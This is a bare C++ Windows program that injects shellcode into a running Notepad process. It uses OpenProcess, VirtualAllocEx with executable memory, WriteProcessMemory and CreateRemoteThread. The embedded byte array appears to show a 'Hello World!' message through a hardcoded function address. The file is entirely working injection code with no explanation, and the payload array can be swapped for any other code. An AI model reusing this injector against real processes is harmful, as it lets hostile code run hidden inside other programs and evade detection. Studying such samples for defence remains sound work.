#include <windows.h>

unsigned char Shellcode[] = 
{
	0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x14, 0x90, 0xB0, 0x6C, 0x88, 0x45, 0xEE, 0x88, 0x45, 0xEF, 0xB0, 
	0x6F, 0xC6, 0x45, 0xEC, 0x48, 0xC6, 0x45, 0xED, 0x65, 0x88, 0x45, 0xF0, 0xC6, 0x45, 0xF1, 0x20, 
	0xC6, 0x45, 0xF2, 0x57, 0x88, 0x45, 0xF3, 0xC6, 0x45, 0xF4, 0x72, 0xC6, 0x45, 0xF5, 0x64, 0xC6, 
	0x45, 0xF6, 0x21, 0xC6, 0x45, 0xF7, 0x00, 0xC7, 0x45, 0xFC, 0xEA, 0x07, 0x45, 0x7E, 0x51, 0x6A, 
	0x00, 0x6A, 0x00, 0x8D, 0x4D, 0xEC, 0x51, 0x6A, 0x00, 0xFF, 0x55, 0xFC, 0x59, 0x33, 0xC0, 0x8B, 
	0xE5, 0x5D, 0xC3
};

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	DWORD dwPid;
	HANDLE hProcess;
	LPVOID pThread;
	::GetWindowThreadProcessId(FindWindow("Notepad", NULL), &dwPid);

	hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if(NULL == hProcess)
		exit(-1);

	pThread = ::VirtualAllocEx(hProcess, NULL, sizeof(Shellcode), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if(NULL == pThread)
		exit(-1);

	::WriteProcessMemory(hProcess, pThread, Shellcode, sizeof(Shellcode), NULL);

	if(NULL == ::CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)pThread, NULL, 0, NULL))
		exit(-1);

 	return 0;
}
